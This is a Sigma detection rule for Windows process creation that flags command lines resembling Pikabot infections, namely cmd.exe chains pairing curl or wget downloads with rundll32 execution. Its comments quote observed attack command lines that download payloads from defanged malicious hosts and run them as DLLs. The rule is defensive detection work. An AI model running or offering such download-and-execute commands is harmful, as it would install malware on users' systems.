title: Process Creation Cmdline Matches Patterns Observed in Pikabot Infections (Variation)
id: e5144106-8198-4f6e-bfc2-0a551cc8dd94
related:
    - id: cd784e67-a7a5-4227-bee8-1dd4f6ee8e79
      type: similar
status: experimental
description: |
    Detects the execution of concatenated CMD.exe commands to download and execute payloads via 'cURL' and 'RunDll32'.
    'ping.exe' and 'timeout.exe' may be abused by adversaries to introduce delays in the command execution.
    'cURL.exe' may be abused by adversaries to download malware and tools.
    'RunDll32.exe' may be abused by adversaries to proxy execution of malicious payloads (dll files).
    In the observed Pikabot infections, a concated commands are used to orchestrate the downlaod and execution of malicious DLL files. 
    This rule also covers potential variations with 'wget' instead of 'cURl'.
references:
    - https://github.com/pr0xylife/Pikabot/blob/main/Pikabot_30.10.2023.txt
    - https://github.com/pr0xylife/Pikabot/blob/main/Pikabot_22.12.2023.txt    
author: Alejandro Houspanossian ('@lekz86')
date: 2023/12/27
tags:
    - attack.execution
    - attack.t1059.003
    - attack.t1105
    - attack.T1218
    - detection.emerging_threats
logsource:
    product: windows
    category: process_creation    
detection:
    selection_cmdline:
        CommandLine|contains|all:  # cmd.exe /c LC || echO LC & pInG LC || cUrl hxxp://188.34.192.184/76DKN6/plast -o %TmP%\LC.sct & pInG -n 3 LC || RUNDLL32 %TmP%\LC.sct, Crash & eXit KCqBSVojsBqrwoS           
            - ' curl'
            - ' rundll32'
    selection_cmdline_mkdir_curl:
        CommandLine|contains|all:  # cmd.exe /c mkdir  C:\Gofkvlgdigt\Ekfgihcifmv & curl hxxps://adanacamasiryikama.com/BDs19Ul/0.8639579070704284.dat --output C:\Gofkvlgdigt\Ekfgihcifmv\Ikfigkvosjr.dll
            - ' mkdir '
            - ' curl'   
    selection_cmdline_mkdir_wget:
        CommandLine|contains|all:
            - ' mkdir '
            - ' wget'               
    selection_cmdline_timeout_rundll32:
        CommandLine|contains|all:  # cmd.exe /c timeout 10 & rundll32 C:\Gofkvlgdigt\Ekfgihcifmv\Ikfigkvosjr.dll,Enter
            - ' timeout '
            - ' rundll32'                   
    selection_cmdline_ping_rundll32:
        CommandLine|contains|all:
            - ' ping '
            - ' rundll32'            
    condition: any of selection_cmdline*
falsepositives:
    - Unknown
level: medium
